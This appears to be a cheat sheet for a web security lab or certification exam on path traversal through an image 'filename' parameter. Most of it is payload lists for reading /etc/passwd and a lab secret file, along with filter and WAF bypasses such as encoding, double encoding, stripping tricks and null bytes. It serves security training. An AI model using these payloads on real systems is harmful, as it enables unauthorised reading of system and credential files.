## 🎯 Target Location

**Primary Target:** `/image?filename=` parameter

## 🔥 Quick Win: Use Burp Scanner

**RECOMMENDED:** Burp Scanner will automatically find and exploit path traversal.

**If scanner works but `/home/carlos/secret` is blocked:**
- WAF might be blocking the word "secret"
- Solution: URL-encode the ENTIRE payload

## 📋 Basic Payloads

### Simple Traversal
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
```

### Target File
```
../../../home/carlos/secret
../../../../home/carlos/secret
../../../../../home/carlos/secret
```

## 🛡️ Bypass Techniques

### Absolute Path Bypass
```
/etc/passwd
/home/carlos/secret
```

---

### Non-Recursive Stripping Bypass
```
....//....//....//etc/passwd
....//....//....//home/carlos/secret
```

---

### URL Encoding Bypass
```
..%2f..%2f..%2fetc%2fpasswd
..%2f..%2f..%2fhome%2fcarlos%2fsecret
```

---

### Double URL Encoding Bypass
```
..%252f..%252f..%252fetc%252fpasswd
..%252f..%252f..%252fhome%252fcarlos%252fsecret
```

---

### Full Path URL Encoding
**⭐ EXAM TIP:** If you can read `/etc/passwd` but not `/home/carlos/secret`

**Encode ENTIRE payload including `/home/carlos/secret`:**
```
%25%32%66%25%32%65%25%32%65%25%32%66...
```

This is double URL-encoded: `../../../../../../home/carlos/secret`

---

### Null Byte Bypass
```
../../../etc/passwd%00.png
../../../home/carlos/secret%00.png
```

## 🎓 Exam Tips

1. **Use Burp Scanner first** - Automatically finds path traversal
2. **Enable image inspection** - Proxy → Options → Intercept Client Requests
3. **Try full URL encoding** - If basic payloads blocked
4. **Try absolute paths** - `/etc/passwd`, `/home/carlos/secret`

---
